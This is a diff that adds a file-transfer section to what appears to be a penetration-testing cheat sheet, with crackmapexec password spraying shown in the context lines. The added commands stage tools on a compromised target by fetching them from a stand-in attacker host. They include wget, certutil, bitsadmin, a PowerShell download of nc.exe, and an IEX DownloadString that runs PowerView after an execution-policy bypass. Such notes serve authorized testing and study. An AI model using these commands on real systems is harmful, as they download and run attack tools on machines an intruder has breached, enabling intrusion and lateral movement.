@@ -55,7 +55,43 @@ crackmapexec smb 10.10.110.0/24 -u users.txt -p password.txt continue-on-success
 
 
 # File Transfer Methods
+## Linux - wget
+```
+# Attacker machine
+cd server/
+python3 -m http.server 80
 
+# Target machine you have shell or RCE
+wget http://atacker_ip:80/name_of_file.php
+```
+
+## Windows - certutil
+```
+# Attacker machine
+cd server/
+python3 -m http.server 80
+
+# Target machine you have shell or RCE
+certutil -urlcache -f http://attacker_ip:80/name_of_file.exe
+```
+
+## Windows - powershell
+```
+# Attacker machine
+cd server/
+python3 -m http.server 80
+
+# Target machine you have shell or RCE (various commands by line - pick what you want)
+powershell wget http://attacker_ip/nc.exe -outfile nc.exe
+
+# Run "powershell -ep bypass" first
+IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1")
+```
+
+## Windows - LOLBAS
+```
+bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe
+```
 
 # Local Enumeration for Privesc
 ## Linux
